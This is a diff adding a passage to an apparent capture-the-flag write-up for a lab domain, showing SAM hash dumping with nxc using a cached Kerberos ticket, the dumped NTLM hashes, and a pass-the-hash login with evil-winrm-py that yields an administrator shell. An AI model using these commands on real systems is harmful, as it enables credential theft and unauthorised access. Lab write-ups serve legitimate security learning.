@@ -561,5 +561,33 @@ SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\Administrato
 
 I am now the administrator on the `web01` machine
 
+```python
+faketime -f +7h nxc smb web01.pirate.htb -u Administrator --use-kcache --sam 
+SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\Administrator from ccache (Pwn3d!)
+SMB         web01.pirate.htb 445    WEB01            [*] Dumping SAM hashes
+SMB         web01.pirate.htb 445    WEB01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
+SMB         web01.pirate.htb 445    WEB01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web01.pirate.htb 445    WEB01            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web01.pirate.htb 445    WEB01            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
+SMB         web01.pirate.htb 445    WEB01            [+] Added 4 SAM hashes to the database
+```
+
+Ill then dump the SAM to get the admin hash
+
+```python
+evil-winrm-py -i web01.pirate.htb -u Administrator -H 'b1aac1584c2ea8ed0a9429684e4fc3e5'    
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to 'web01.pirate.htb:5985' as 'Administrator'
+evil-winrm-py PS C:\Users\Administrator\Documents>
+```
+
+And now i can authenticate to the `web01` machine as the administrator
+
 
 
